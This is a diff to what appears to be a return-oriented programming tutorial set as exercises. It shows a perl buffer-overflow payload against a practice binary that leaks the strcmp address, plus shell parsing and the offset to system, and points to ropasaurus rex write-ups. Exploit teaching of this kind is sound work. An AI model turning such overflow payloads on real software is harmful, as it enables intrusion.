@@ -573,9 +573,46 @@ example.
 
 So the offset from strcmp to system is -0x3fdc0.
 
+We just have to use our previous command, output strcmp address and add the
+offset. A bit of unix magic will help: here we use xxd to get an hexadecimal
+representation, cut to get the right columms and sed to get the right line
+and rearrange the fields into a proper hexadecimal representation of the
+address. You may have to fiddle a bit with those commands to get them right
+as the output can be a bit different from a computer to the other.
+
+::
+
+    $ perl -e 'print "A"x92 . "\xa0\x83\x04\x08\x2c\x85\x04\x08\xa0\x99\x04\x08"'\
+      | ./ropeme admin42 \
+      | xxd \
+      | cut -d ' ' -f 2,3 \
+      | sed -n '3s/\(....\) \(....\)/0x\2\1/p'
+    0xf7504070
+    Segmentation fault (core dumped)
+
+There it is!
+
+Exercise 9
+==========
+
+In the previous exercise we got the address of the system command.
+
 Of course having it for a paste instance is quite useless, we must now find
 a way to use it without quitting the process. There are two strategies:
 either we stay within the program and build the address by using ROP gadgets
 astuciously, either we consider use the program as a server, have it output
 the address, compute the offset outside the process and then have the process
 read the new address back.
+
+Exercise 10
+===========
+
+I won't provide a solution for the ropasaurus rex, there are already a number
+of great writeup on the internet. My two favourite are:
+
+- https://blog.skullsecurity.org/2013/ropasaurusrex-a-primer-on-return-oriented-programming
+
+- https://crowell.github.io/blog/2014/11/23/pwning-with-radare2/
+
+But you really should be able to solve it yourself. You can do it!
+
